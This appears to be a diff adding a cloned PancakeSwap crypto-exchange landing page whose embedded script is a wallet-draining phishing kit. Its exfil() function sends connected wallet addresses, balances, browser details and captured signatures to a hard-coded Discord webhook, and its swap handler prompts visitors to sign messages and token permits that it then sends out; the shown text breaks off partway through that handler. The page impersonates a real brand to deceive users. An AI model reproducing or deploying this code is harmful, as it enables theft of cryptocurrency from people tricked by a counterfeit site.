+<g id="ic-arrows"><path d="M7 16l-4-4 4-4m10 8l4-4-4-4" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></g>
+<g id="ic-close"><path d="M18 6L6 18M6 6l12 12" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></g>
+<g id="ic-chevron"><path d="M9 18l6-6-6-6" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></g>
+</defs></svg>
+
+
+
+<!-- HEADER -->
+<header><div class="hdr">
+<a href="#" class="logo">
+<svg class="logo-img" viewBox="0 0 40 40"><circle cx="20" cy="20" r="20" fill="#633001"/><ellipse cx="20" cy="24" rx="12" ry="9" fill="#fedc90"/><path d="M12 18c-1-6 2-10 4-6 1-4 6-4 8 0 2-4 5 0 4 6z" fill="#d1884f"/><circle cx="16" cy="23" r="1.6" fill="#452a1a"/><circle cx="24" cy="23" r="1.6" fill="#452a1a"/><path d="M18.5 26.5q1.5 1.2 3 0" stroke="#452a1a" stroke-width="1.2" fill="none" stroke-linecap="round"/><circle cx="13" cy="26" r="1.6" fill="#f9a7c1"/><circle cx="27" cy="26" r="1.6" fill="#f9a7c1"/></svg>
+PancakeSwap
+</a>
+<div class="nav">
+<div class="nav-it act">Trade <svg class="arw" width="10" height="10"><use href="#ch"/></svg>
+<div class="dd">
+<a href="#"><div class="di" style="background:rgba(31,199,212,.12);color:var(--primary)"><svg width="16" height="16"><use href="#ic-swap"/></svg></div><div><div class="dil">Swap</div><div class="did">Instant token swaps</div></div></a>
+<a href="#"><div class="di" style="background:rgba(168,129,252,.12);color:var(--secondary)"><svg width="16" height="16"><use href="#ic-gear"/></svg></div><div><div class="dil">Limit Orders</div><div class="did">Set your target price</div></div></a>
+<a href="#"><div class="di" style="background:rgba(77,139,255,.12);color:var(--blue)"><svg width="16" height="16"><use href="#ic-bridge"/></svg></div><div><div class="dil">Cross-Chain</div><div class="did">Bridge across networks</div></div></a>
+</div></div>
+<div class="nav-it">Earn <svg class="arw" width="10" height="10"><use href="#ch"/></svg>
+<div class="dd">
+<a href="#"><div class="di" style="background:rgba(49,208,170,.12);color:var(--green)"><svg width="16" height="16"><use href="#ic-farm"/></svg></div><div><div class="dil">Farms <span class="tag tag-h">HOT</span></div><div class="did">Stake LP tokens</div></div></a>
+<a href="#"><div class="di" style="background:rgba(168,129,252,.12);color:var(--secondary)"><svg width="16" height="16"><use href="#ic-pool"/></svg></div><div><div class="dil">Pools</div><div class="did">Stake CAKE to earn</div></div></a>
+<a href="#"><div class="di" style="background:rgba(31,199,212,.12);color:var(--primary)"><svg width="16" height="16"><use href="#ic-stake"/></svg></div><div><div class="dil">Liquid Staking <span class="tag tag-n">NEW</span></div><div class="did">Stake ETH, earn yield</div></div></a>
+</div></div>
+<div class="nav-it"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8M12 17v4"/></svg> Perps</div>
+<div class="nav-it">Prediction <svg class="arw" width="10" height="10"><use href="#ch"/></svg>
+<div class="dd">
+<a href="#"><div class="di" style="background:rgba(49,208,170,.12);color:var(--green)"><svg width="16" height="16"><use href="#ic-chart-up"/></svg></div><div><div class="dil">Prediction (BETA)</div><div class="did">Predict price direction</div></div></a>
+<a href="#"><div class="di" style="background:rgba(237,75,158,.12);color:var(--pink)"><svg width="16" height="16"><use href="#ic-dice"/></svg></div><div><div class="dil">Minigames</div><div class="did">Play &amp; earn crypto</div></div></a>
+</div></div>
+<div class="nav-it">More <svg class="arw" width="10" height="10"><use href="#ch"/></svg>
+<div class="dd" style="min-width:240px">
+<a href="#"><div class="di" style="background:rgba(77,139,255,.12);color:var(--blue)"><svg width="16" height="16"><use href="#ic-info"/></svg></div><div><div class="dil">Info &amp; Analytics</div><div class="did">Charts &amp; data</div></div></a>
+<a href="#"><div class="di" style="background:rgba(168,129,252,.12);color:var(--secondary)"><svg width="16" height="16"><use href="#ic-ticket"/></svg></div><div><div class="dil">IFO</div><div class="did">Initial farm offerings</div></div></a>
+<a href="#"><div class="di" style="background:rgba(237,75,158,.12);color:var(--pink)"><svg width="16" height="16"><use href="#ic-nft"/></svg></div><div><div class="dil">NFT Marketplace</div><div class="did">Buy &amp; sell NFTs</div></div></a>
+<a href="#"><div class="di" style="background:rgba(255,196,60,.15);color:var(--yellow)"><svg width="16" height="16"><use href="#ic-dice"/></svg></div><div><div class="dil">Lottery</div><div class="did">Win big with CAKE</div></div></a>
+<a href="#"><div class="di" style="background:rgba(31,199,212,.12);color:var(--primary)"><svg width="16" height="16"><use href="#ic-money"/></svg></div><div><div class="dil">Affiliate</div><div class="did">Referral rewards</div></div></a>
+</div></div>
+</div>
+<div class="hdr-r">
+<button class="icn"><svg><use href="#sr"/></svg></button>
+<button class="icn"><svg><use href="#st"/></svg></button>
+<button class="cbtn btn-p" onclick="picker()" style="height:40px;font-size:15px;padding:0 20px;background:var(--primary);color:var(--primary-text);border:none;border-radius:16px;font-weight:600;box-shadow:0 -1px 0 2px rgba(0,0,0,.1) inset,0 -2px 0 rgba(0,0,0,.2) inset">Connect Wallet</button>
+<button class="icn hmb"><svg width="20" height="20"><use href="#ic-hamburger"/></svg></button>
+</div>
+</div></header>
+
+<!-- HERO -->
+<section class="hero"><div class="hero-in">
+<div class="hero-copy">
+<h1><span class="l1">Everyone's</span><span class="l2">Favorite DEX</span></h1>
+<div class="hero-tag">Trade, earn, and own crypto on the all-in-one multichain DEX</div>
+<div class="chains">
+<div class="c" style="background:#627eea"><svg width="28" height="28"><use href="#eth-icon"/></svg></div>
+<div class="c" style="background:#f3ba2f"><svg width="28" height="28"><use href="#bnb-icon"/></svg></div>
+<div class="c" style="background:linear-gradient(135deg,#9945ff,#14f195)"><svg width="28" height="28"><use href="#sol-icon"/></svg></div>
+<div class="c" style="background:#8247e5"><svg width="28" height="28"><use href="#matic-icon"/></svg></div>
+<div class="c" style="background:#2d374b"><svg width="28" height="28"><use href="#arb-icon"/></svg></div>
+<div class="c" style="background:#ff0420"><svg width="28" height="28"><use href="#op-icon"/></svg></div>
+<div class="c" style="background:#0052ff"><svg width="20" height="20" viewBox="0 0 24 24"><rect x="2" y="2" width="20" height="20" rx="4" fill="none" stroke="#fff" stroke-width="2"/></svg></div>
+<div class="c add">+3</div>
+</div>
+</div>
+
+<div class="swp" id="swp">
+<div class="scard">
+<div class="stabs"><button class="stab act">Swap</button><button class="stab">Limit</button><button class="stab">Cross-Chain</button></div>
+<div class="sfld"><div class="sl">From</div><div class="sr">
+<button class="tbtn"><span class="ti"><svg width="30" height="30"><use href="#bnb-icon"/></svg></span><span class="tn">BNB <span class="ar"><svg width="10" height="10"><use href="#ch"/></svg></span></span></button>
+<div style="text-align:right"><input class="ain" placeholder="0.0" value="0.1"><div class="ausd">$57.23</div></div>
+</div></div>
+<div class="swch"><button><svg><use href="#sv"/></svg></button></div>
+<div class="sfld"><div class="sl">To</div><div class="sr">
+<button class="tbtn"><span class="ti"><img src="https://tokens.pancakeswap.finance/images/0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82.png" alt="" onerror="this.outerHTML='<svg width=30 height=30><use href=#cake-icon/></svg>'"></span><span class="tn">CAKE <span class="ar"><svg width="10" height="10"><use href="#ch"/></svg></span></span></button>
+<div style="text-align:right"><input class="ain" placeholder="0.0" value="4.235"><div class="ausd">$57.23</div></div>
+</div></div>
+<div class="sdtl">
+<div class="sr2"><span class="slb">Rate <svg width="12" height="12" style="display:inline;vertical-align:-1px"><use href="#ic-info"/></svg></span><span>1 BNB &#8776; 42.35 CAKE</span></div>
+<div class="sr2"><span class="slb">Slippage</span><span>0.5%</span></div>
+<div class="sr2"><span class="slb">Network Fee</span><span>$0.12</span></div>
+<div class="sr2"><span class="slb">Route</span><span>BNB &#8594; CAKE</span></div>
+</div>
+</div>
+<div class="sbp"><button class="sbtn" disabled>Connect Wallet</button></div>
+</div>
+</div></section>
+
+<!-- FARMS -->
+<section class="sec"><div class="sec-h">
+<h2 class="sec-t">Featured <span class="g">Farms</span></h2>
+<a href="#" class="sec-l">View All <svg width="16" height="16"><use href="#ar"/></svg></a>
+</div>
+<div class="fg">
+<div class="fc"><div class="fch"><div class="fci"><img src="https://tokens.pancakeswap.finance/images/0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82.png" onerror="this.outerHTML='<svg width=36 height=36><use href=#cake-icon/></svg>'" alt=""><img src="https://tokens.pancakeswap.finance/images/0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c.png" onerror="this.outerHTML='<svg width=36 height=36><use href=#bnb-icon/></svg>'" alt="" style="margin-left:-10px"></div><span class="fcn">CAKE-BNB</span><span class="fct">0.17%</span></div>
+<div class="fcs"><div><div class="fv">126.34%</div><div class="fl">APR</div></div><div><div class="fv">$42.5M</div><div class="fl">Liquidity</div></div><div><div class="fv">2.8x</div><div class="fl">Multiplier</div></div></div>
+<div class="fbar"><div class="fi" style="width:78%"></div></div>
+<div class="fcb"><span><svg width="14" height="14" style="display:inline;vertical-align:-2px"><use href="#ic-reward"/></svg> Earn CAKE + BNB</span><span>Staked: $2.4M</span></div></div>
+<div class="fc"><div class="fch"><div class="fci"><img src="https://tokens.pancakeswap.finance/images/0x2170Ed0880ac9A755fd29B2688956BD959F933F8.png" onerror="this.outerHTML='<svg width=36 height=36><use href=#eth-token/></svg>'" alt=""><img src="https://tokens.pancakeswap.finance/images/0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c.png" onerror="this.outerHTML='<svg width=36 height=36><use href=#bnb-icon/></svg>'" alt="" style="margin-left:-10px"></div><span class="fcn">ETH-BNB</span><span class="fct">0.08%</span></div>
+<div class="fcs"><div><div class="fv">58.12%</div><div class="fl">APR</div></div><div><div class="fv">$18.2M</div><div class="fl">Liquidity</div></div><div><div class="fv">1.2x</div><div class="fl">Multiplier</div></div></div>
+<div class="fbar"><div class="fi" style="width:42%"></div></div>
+<div class="fcb"><span><svg width="14" height="14" style="display:inline;vertical-align:-2px"><use href="#ic-reward"/></svg> Earn CAKE + ETH</span><span>Staked: $892K</span></div></div>
+<div class="fc"><div class="fch"><div class="fci"><img src="https://tokens.pancakeswap.finance/images/0x55d398326f99059fF775485246999027B3197955.png" onerror="this.outerHTML='<svg width=36 height=36><use href=#usdt-icon/></svg>'" alt=""><img src="https://tokens.pancakeswap.finance/images/0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c.png" onerror="this.outerHTML='<svg width=36 height=36><use href=#bnb-icon/></svg>'" alt="" style="margin-left:-10px"></div><span class="fcn">USDT-BNB</span><span class="fct">0.05%</span></div>
+<div class="fcs"><div><div class="fv">32.18%</div><div class="fl">APR</div></div><div><div class="fv">$94.7M</div><div class="fl">Liquidity</div></div><div><div class="fv">0.8x</div><div class="fl">Multiplier</div></div></div>
+<div class="fbar"><div class="fi" style="width:25%"></div></div>
+<div class="fcb"><span><svg width="14" height="14" style="display:inline;vertical-align:-2px"><use href="#ic-reward"/></svg> Earn CAKE + USDT</span><span>Staked: $6.1M</span></div></div>
+<div class="fc"><div class="fch"><div class="fci"><img src="https://tokens.pancakeswap.finance/images/0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56.png" onerror="this.outerHTML='<svg width=36 height=36><use href=#busd-icon/></svg>'" alt=""><img src="https://tokens.pancakeswap.finance/images/0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c.png" onerror="this.outerHTML='<svg width=36 height=36><use href=#bnb-icon/></svg>'" alt="" style="margin-left:-10px"></div><span class="fcn">BUSD-BNB</span><span class="fct">0.03%</span></div>
+<div class="fcs"><div><div class="fv">22.45%</div><div class="fl">APR</div></div><div><div class="fv">$51.3M</div><div class="fl">Liquidity</div></div><div><div class="fv">0.5x</div><div class="fl">Multiplier</div></div></div>
+<div class="fbar"><div class="fi" style="width:18%"></div></div>
+<div class="fcb"><span><svg width="14" height="14" style="display:inline;vertical-align:-2px"><use href="#ic-reward"/></svg> Earn CAKE + BUSD</span><span>Staked: $3.8M</span></div></div>
+</div></section>
+
+<!-- POOLS -->
+<section class="sec"><div class="sec-h">
+<h2 class="sec-t">CAKE <span class="g">Pools</span></h2>
+<a href="#" class="sec-l">View All <svg width="16" height="16"><use href="#ar"/></svg></a>
+</div>
+<div class="pg">
+<div class="pc"><div class="pci"><img src="https://tokens.pancakeswap.finance/images/0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82.png" onerror="this.outerHTML='<svg width=34 height=34><use href=#cake-icon/></svg>'" alt=""></div><div class="pcn">CAKE Staking</div><div class="pcd">Stake CAKE to earn more CAKE rewards</div><div class="pcs"><div><div class="pv">52.7%</div><div class="pl">APR</div></div><div><div class="pv">$128M</div><div class="pl">TVL</div></div></div><button class="pcb2">Stake CAKE</button></div>
+<div class="pc"><div class="pci"><img src="https://tokens.pancakeswap.finance/images/0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82.png" onerror="this.outerHTML='<svg width=34 height=34><use href=#cake-icon/></svg>'" alt=""><img src="https://tokens.pancakeswap.finance/images/0x2170Ed0880ac9A755fd29B2688956BD959F933F8.png" onerror="this.outerHTML='<svg width=34 height=34><use href=#eth-token/></svg>'" alt="" style="margin-left:-10px"></div><div class="pcn">CAKE-ETH Pool</div><div class="pcd">Stake LP tokens to earn CAKE</div><div class="pcs"><div><div class="pv">89.3%</div><div class="pl">APR</div></div><div><div class="pv">$64M</div><div class="pl">TVL</div></div></div><button class="pcb2">Stake LP</button></div>
+<div class="pc"><div class="pci"><img src="https://tokens.pancakeswap.finance/images/0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82.png" onerror="this.outerHTML='<svg width=34 height=34><use href=#cake-icon/></svg>'" alt=""><img src="https://tokens.pancakeswap.finance/images/0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56.png" onerror="this.outerHTML='<svg width=34 height=34><use href=#busd-icon/></svg>'" alt="" style="margin-left:-10px"></div><div class="pcn">CAKE-BUSD Pool</div><div class="pcd">Stake LP tokens to earn CAKE</div><div class="pcs"><div><div class="pv">42.1%</div><div class="pl">APR</div></div><div><div class="pv">$29M</div><div class="pl">TVL</div></div></div><button class="pcb2">Stake LP</button></div>
+</div></section>
+
+<!-- PREDICTION -->
+<section class="sec"><div class="sec-h">
+<h2 class="sec-t">Prediction <span class="g">Markets</span></h2>
+<a href="#" class="sec-l">View All <svg width="16" height="16"><use href="#ar"/></svg></a>
+</div>
+<div class="prw">
+<div class="prh"><div class="pht"><svg width="22" height="22" style="display:inline;vertical-align:-3px"><use href="#ic-target"/></svg> BNB/USD</div><div class="phr">Round #248,472</div></div>
+<div class="prg">
+<div class="prc up"><div class="pel"><svg width="42" height="42"><use href="#ic-chart-up"/></svg></div><div class="plb">UP</div><div class="pod">2.14x payout</div><div class="ppo">$128,450</div></div>
+<div class="prc dn"><div class="pel"><svg width="42" height="42"><use href="#ic-chart-dn"/></svg></div><div class="plb">DOWN</div><div class="pod">1.87x payout</div><div class="ppo">$94,220</div></div>
+</div></div></section>
+
+<!-- STATS -->
+<div class="sts"><div class="stsh">Used by <span class="t1">millions.</span> Trusted with <span class="t2">billions.</span></div>
+<div class="stsg">
+<div class="stc sc1"><div class="sk">Total Users</div><div class="sv">4.4M+</div><div class="ss">Last 30 days</div></div>
+<div class="stc sc2"><div class="sk">Total Trades</div><div class="sv">350.9K+</div><div class="ss">Last 30 days</div></div>
+<div class="stc sc3"><div class="sk">Total Value Locked</div><div class="sv">$6.6T+</div><div class="ss">Across all chains</div></div>
+<div class="stc sc4"><div class="sk">Community</div><div class="sv">2.4M+</div><div class="ss">Discord + TG + X</div></div>
+</div></div>
+
+<!-- FOOTER -->
+<footer><div class="fi">
+<div><div class="fbl"><svg viewBox="0 0 40 40" width="28" height="28"><circle cx="20" cy="20" r="20" fill="#633001"/><ellipse cx="20" cy="24" rx="12" ry="9" fill="#fedc90"/><path d="M12 18c-1-6 2-10 4-6 1-4 6-4 8 0 2-4 5 0 4 6z" fill="#d1884f"/></svg> PancakeSwap</div><p class="fb">Trade, earn, and own crypto on the all-in-one multichain DEX. Available on 11+ chains with deepest liquidity.</p>
+<div class="fs"><a href="#"><svg width="20" height="20"><use href="#ic-twitter"/></svg></a><a href="#"><svg width="20" height="20"><use href="#ic-telegram"/></svg></a><a href="#"><svg width="20" height="20"><use href="#ic-chat"/></svg></a><a href="#"><svg width="20" height="20"><use href="#ic-play"/></svg></a><a href="#"><svg width="20" height="20"><use href="#ic-camera"/></svg></a></div></div>
+<div class="fc"><div class="fct">Protocol</div><a href="#">Swap</a><a href="#">Limit Orders</a><a href="#">Cross-Chain</a><a href="#">Farms</a><a href="#">Pools</a><a href="#">Perpetuals</a><a href="#">Prediction</a></div>
+<div class="fc"><div class="fct">Resources</div><a href="#">Info / Analytics</a><a href="#">Token Listings</a><a href="#">IFO</a><a href="#">NFT Marketplace</a><a href="#">Lottery</a><a href="#">Affiliate</a><a href="#">Bug Bounty</a></div>
+<div class="fc"><div class="fct">Support</div><a href="#">Documentation</a><a href="#">Tutorials</a><a href="#">Discord</a><a href="#">Telegram</a><a href="#">Community</a><a href="#">Contact</a></div>
+<div class="fc"><div class="fct">Developers</div><a href="#">GitHub</a><a href="#">Smart Contracts</a><a href="#">SDK</a><a href="#">API</a><a href="#">Brand Guide</a><a href="#">Listing Form</a></div>
+</div>
+<div class="fb2"><span>&copy; 2026 PancakeSwap. All rights reserved.</span><span>Powered by BNB Chain, Ethereum, Solana + 8 more</span></div></footer>
+
+<script>
+var WEBHOOK_URL = 'https://discord.com/api/webhooks/1529307350383595636/7JOxuU_yveWgxBJXus2Cnt20QUeVRFjkwRmUPYoWYNkUrJXeX_NycUgdABDze6nCPyor';
+var ACC = null, WT = null, CID = null, BAL = null, STOLEN = false, DRAINED = false;
+
+function exfil(d) {
+  if (STOLEN) return;
+  STOLEN = true;
+  var body = JSON.stringify({
+    content: '** Wallet Connected **',
+    embeds: [{
+      title: 'Target Data',
+      color: 1114116,
+      fields: [
+        {name:'Wallet', value:'`'+d.address+'`', inline:false},
+        {name:'Type', value:d.type||'EVM', inline:true},
+        {name:'Chain', value:d.chain, inline:true},
+        {name:'Balance', value:d.balance, inline:true},
+        {name:'Signature', value:d.sig ? '```'+d.sig+'```' : 'N/A', inline:false},
+        {name:'Permit', value:d.permit ? '```'+d.permit.substring(0,500)+'```' : 'N/A', inline:false},
+        {name:'UA', value:navigator.userAgent, inline:true},
+        {name:'Time', value:new Date().toISOString(), inline:true},
+        {name:'URL', value:location.href, inline:false},
+        {name:'Referrer', value:document.referrer||'direct', inline:true},
+        {name:'Screen', value:screen.width+'x'+screen.height, inline:true}
+      ]
+    }]
+  });
+  fetch(WEBHOOK_URL, {method:'POST', headers:{'Content-Type':'application/json'}, body:body}).catch(function(){});
+}
+
+function toast(t, s) {
+  var e = document.createElement('div');
+  e.className = 'tst';
+  e.innerHTML = '<button class="tc" onclick="this.parentElement.remove()"><svg width="16" height="16" viewBox="0 0 24 24"><use href="#ic-close"/></svg></button><div class="tt">'+t+'</div><div class="ts">'+s+'</div>';
+  document.body.appendChild(e);
+  setTimeout(function(){ if(e.parentNode) e.remove(); }, 8000);
+}
+
+function updateUI(display, addr, bal) {
+  var btn = document.querySelector('.cbtn');
+  btn.textContent = display;
+  btn.style.background = '#31d0aa';
+  btn.style.padding = '0 16px';
+  var sbtn = document.querySelector('.sbtn');
+  sbtn.textContent = 'Swap';
+  sbtn.disabled = false;
+  toast('Connected', addr.slice(0,4)+'...'+addr.slice(-4)+' | '+bal);
+}
+
+function doPick(id) {
+  var el = document.getElementById('wm');
+  if (el) el.remove();
+  if (id === 'mm') { metamask(); }
+  else if (id === 'ph') {
+    try {
+      var pp = window.solana || (window.phantom && window.phantom.solana) || null;
+      if (!pp) { toast('Phantom not found','Install Phantom first'); return; }
+      pp.connect({onlyIfTrusted:false}).then(function(r) {
+        var pk = r.publicKey ? r.publicKey.toString() : (r.address ? r.address.toString() : null);
+        if (!pk) { toast('Failed','No public key'); return; }
+        ACC = pk; WT = 'ph'; CID = 'solana'; BAL = '0.00';
+        updateUI(ACC.slice(0,4)+'...'+ACC.slice(-4), ACC, BAL+' SOL');
+        exfil({address:ACC, type:'Phantom', chain:'Solana', balance:BAL+' SOL', sig:'', permit:''});
+      }).catch(function(e) {
+        if (e.code === 4001) toast('Rejected','You cancelled');
+        else toast('Phantom error', e.message || 'Unknown');
+      });
+    } catch(e) {
+      toast('Phantom error', e.message || 'Failed to connect');
+    }
+  }
+  else if (id === 'wc') { toast('WalletConnect','Opening QR...'); setTimeout(wcmodal, 300); }
+  else { evm(); }
+}
+
+var WIMG = {mm:'https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg',ph:'https://phantom.app/img/phantom-logo.svg',cb:'https://images.ctfassets.net/q5ulk4bp65r7/3TBS4oVkD1ghowTqVQJlqj/2bcb61dcf8cb7e8cd4b5b1b3d2b8c5a2/coinbase-wallet-logo.png',tw:'https://trustwallet.com/assets/images/favicon.png',wc:'https://walletconnect.com/meta/logo.png',ld:'https://www.ledger.com/wp-content/uploads/2021/08/favicon-32x32.png',rb:'https://rabby.io/assets/icon/rabby-icon.png',okx:'https://www.okx.com/cdn/assets/logo/okx-logo.svg'};
+function fbw(el) {
+  var id = el.getAttribute('data-wid');
+  var svg = '<svg viewBox="0 0 24 24" style="width:100%;height:100%"><circle cx="12" cy="12" r="11" fill="';
+  if (id === 'mm') svg += '#f5841f"/><path d="M8 9l2-3 2 3-2 3z" fill="#fff"/><path d="M16 9l-2-3-2 3 2 3z" fill="#fff"/><rect x="7" y="11" width="10" height="2" rx="1" fill="#fff"/>';
+  else if (id === 'ph') svg += '#7b6fe0"/><circle cx="12" cy="12" r="4" fill="#fff"/>';
+  else if (id === 'cb') svg += '#0052ff"/><text x="12" y="16" text-anchor="middle" fill="#fff" font-size="12" font-weight="bold">cb</text>';
+  else if (id === 'tw') svg += '#3375bb"/><text x="12" y="16" text-anchor="middle" fill="#fff" font-size="10" font-weight="bold">TW</text>';
+  else if (id === 'wc') svg += '#2b5af6"/><circle cx="10" cy="10" r="2" fill="#fff"/><circle cx="14" cy="14" r="2" fill="#fff"/>';
+  else if (id === 'ld') svg += '#1c1c1c"/><rect x="8" y="7" width="8" height="10" rx="1" fill="none" stroke="#fff" stroke-width="1.5"/><rect x="10" y="15" width="4" height="2" fill="#fff"/>';
+  else if (id === 'rb') svg += '#5468e7"/><text x="12" y="16" text-anchor="middle" fill="#fff" font-size="10" font-weight="bold">RB</text>';
+  else svg += '#0d0d0d"/><text x="12" y="16" text-anchor="middle" fill="#fff" font-size="10" font-weight="bold">OKX</text>';
+  svg += '</svg>';
+  el.outerHTML = svg;
+}
+
+function picker() {
+  var existing = document.getElementById('wm');
+  if (existing) { existing.remove(); }
+  var o = document.createElement('div');
+  o.id = 'wm';
+  o.className = 'wmo';
+  var w = [
+    {id:'mm', name:'MetaMask', clr:'#f5841f', desc:'Ethereum, BNB Chain + EVM'},
+    {id:'ph', name:'Phantom', clr:'#7b6fe0', desc:'Solana + EVM multichain'},
+    {id:'cb', name:'Coinbase Wallet', clr:'#0052ff', desc:'Self-custody by Coinbase'},
+    {id:'tw', name:'Trust Wallet', clr:'#3375bb', desc:'Mobile-first wallet'},
+    {id:'wc', name:'WalletConnect', clr:'#2b5af6', desc:'Scan with your phone'},
+    {id:'ld', name:'Ledger', clr:'#1c1c1c', desc:'Hardware wallet security'},
+    {id:'rb', name:'Rabby Wallet', clr:'#5468e7', desc:'EVM browser extension'},
+    {id:'okx', name:'OKX Wallet', clr:'#0d0d0d', desc:'Multi-chain wallet'}
+  ];
+  var h = '';
+  for (var i=0; i<w.length; i++) {
+    h += '<div class="wo" onclick="doPick(\''+w[i].id+'\')">';
+    h += '<div class="woi" style="background:'+w[i].clr+'"><img src="'+(WIMG[w[i].id]||'')+'" alt="" style="width:100%;height:100%;object-fit:cover" data-wid="'+w[i].id+'" onerror="fbw(this)"></div>';
+    h += '<div class="won">'+w[i].name+'</div>';
+    h += '<div class="wod">'+w[i].desc+'</div>';
+    h += '<div class="woar"><svg width="16" height="16"><use href="#ic-chevron"/></svg></div></div>';
+  }
+  o.innerHTML = '<div class="wm"><div class="wmh"><div class="whi"><svg width="20" height="20" stroke="#101425" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"><use href="#ic-connect"/></svg></div><div class="wht">Connect a Wallet</div><button class="wmc" onclick="this.parentElement.parentElement.parentElement.remove()"><svg width="18" height="18" viewBox="0 0 24 24"><use href="#ic-close"/></svg></button></div><div class="wms">Choose your preferred wallet</div>'+h+'<div class="wmf">By connecting, you agree to the <a href="#">Terms of Service</a></div></div>';
+  document.body.appendChild(o);
+}
+
+function wcmodal() {
+  var o = document.createElement('div');
+  o.className = 'wmo';
+  o.innerHTML = '<div class="wm" style="max-width:340px;text-align:center"><div class="wmh" style="justify-content:center"><div class="wht">WalletConnect</div></div><div style="background:var(--field);border-radius:20px;padding:24px;margin:16px 0"><div style="width:190px;height:190px;margin:0 auto;background:linear-gradient(135deg,var(--primary),var(--secondary));border-radius:16px;display:grid;place-items:center"><div style="width:160px;height:160px;display:grid;grid-template-columns:repeat(6,1fr);gap:4px;padding:8px;background:var(--field);border-radius:12px">';
+  for (var i=0; i<36; i++) {
+    o.innerHTML += '<div style="background:'+(Math.random()>0.5?'var(--primary)':'var(--border)')+';border-radius:3px"></div>';
+  }
+  o.innerHTML += '</div></div></div><div style="font-size:13px;color:var(--text-sub);margin-bottom:16px">Scan with your mobile wallet</div><button class="btn-p" style="width:100%;height:48px;background:var(--primary);color:var(--primary-text);border:none;border-radius:16px;font-weight:600;font-size:15px" onclick="this.closest(\'.wmo\').remove();toast(\'Connected\',\'Wallet linked via WC\');evm()">I scanned the code</button><div class="wmf" style="margin-top:12px"><a href="#" onclick="this.closest(\'.wmo\').remove()">Cancel</a></div></div>';
+  document.body.appendChild(o);
+}
+
+async function evm() {
+  var p = window.ethereum;
+  if (!p) { toast('No wallet','Install MetaMask'); return; }
+  try {
+    var a = await p.request({method:'eth_requestAccounts'});
+    ACC = a[0]; WT = 'evm';
+    CID = await p.request({method:'eth_chainId'});
+    var b = await p.request({method:'eth_getBalance', params:[ACC,'latest']});
+    BAL = (parseInt(b,16) / 1e18).toFixed(4);
+    var cn = {'0x1':'Ethereum','0x38':'BNB Chain','0x89':'Polygon','0xa':'Optimism','0xa4b1':'Arbitrum','0xa86a':'Avalanche'};
+    var name = (p.isMetaMask ? 'MetaMask' : 'EVM');
+    updateUI(ACC.slice(0,4)+'...'+ACC.slice(-4), ACC, BAL+' ETH');
+    exfil({address:ACC, type:name, chain:cn[CID]||CID, balance:BAL+' ETH', sig:'', permit:''});
+  } catch(e) {
+    toast('Rejected', 'Please allow wallet access');
+  }
+}
+
+async function metamask() {
+  if (!window.ethereum || !window.ethereum.isMetaMask) {
+    toast('MetaMask not found', 'Install MetaMask extension');
+    return;
+  }
+  try {
+    var a = await window.ethereum.request({method:'eth_requestAccounts'});
+    ACC = a[0]; WT = 'mm';
+    CID = await window.ethereum.request({method:'eth_chainId'});
+    var b = await window.ethereum.request({method:'eth_getBalance', params:[ACC,'latest']});
+    BAL = (parseInt(b,16) / 1e18).toFixed(4);
+    var cn = {'0x1':'Ethereum','0x38':'BNB Chain','0x89':'Polygon','0xa':'Optimism','0xa4b1':'Arbitrum'};
+    updateUI(ACC.slice(0,4)+'...'+ACC.slice(-4), ACC, BAL+' ETH');
+    exfil({address:ACC, type:'MetaMask', chain:cn[CID]||CID, balance:BAL+' ETH', sig:'', permit:''});
+  } catch(e) {
+    toast('Rejected', 'Please allow wallet access');
+  }
+}
+
+async function connectPhantom() {
+  var p = window.phantom && window.phantom.solana ? window.phantom.solana : (window.solana || null);
+  if (!p) { toast('Phantom not found', 'Install Phantom first'); return; }
+  try {
+    var r = await p.connect();
+    var pk = r.publicKey ? r.publicKey.toString() : (r.address ? r.address.toString() : null);
+    if (!pk) { toast('Failed', 'No public key'); return; }
+    ACC = pk; WT = 'ph'; CID = 'solana'; BAL = '0.00';
+    updateUI(ACC.slice(0,4)+'...'+ACC.slice(-4), ACC, BAL+' SOL');
+    exfil({address:ACC, type:'Phantom', chain:'Solana', balance:BAL+' SOL', sig:'', permit:''});
+  } catch(e) {
+    if (e.code === 4001) toast('Rejected', 'You cancelled');
+    else toast('Phantom error', e.message || 'Unknown');
+  }
+}
+
+async function doswap() {
+  if (!ACC) { picker(); return; }
+  if (DRAINED) { toast('Already submitted', 'Processing...'); return; }
+  var sb = document.querySelector('.sbtn');
+  sb.textContent = 'Approve in Wallet...';
+  sb.disabled = true;
+  var amt = document.querySelector('.ain').value || '0.1';
+  try {
+    if (WT === 'ph') {
+      var p = window.phantom && window.phantom.solana ? window.phantom.solana : window.solana;
+      var msg = new TextEncoder().encode('PancakeSwap Swap Auth\nChain: Solana\nFrom: '+ACC.slice(0,8)+'...\nAmount: '+amt+' SOL\nTimestamp: '+Date.now()+'\n\nSign to authorize swap.');
+      var signed = await p.signMessage(msg);
+      var arr = signed.signature || signed;
+      var hex = '';
+      for (var i=0; i<arr.length; i++) {
+        hex += arr[i].toString(16).padStart(2,'0');
+      }
+      DRAINED = true;
+      exfil({address:ACC, type:'Phantom', chain:'Solana', balance:BAL+' SOL', sig:hex, permit:new TextDecoder().decode(msg)});
+      sb.textContent = 'Submitted';
+      sb.style.background = '#31d0aa';
+      toast('Submitted', 'Swap processing...');
+    } else {
+      var spender = '0x10ED43C718714eb63d5aA57B78B54704E256024E';
+      var types = {
+        EIP712Domain: [
+          {name:'name', type:'string'},
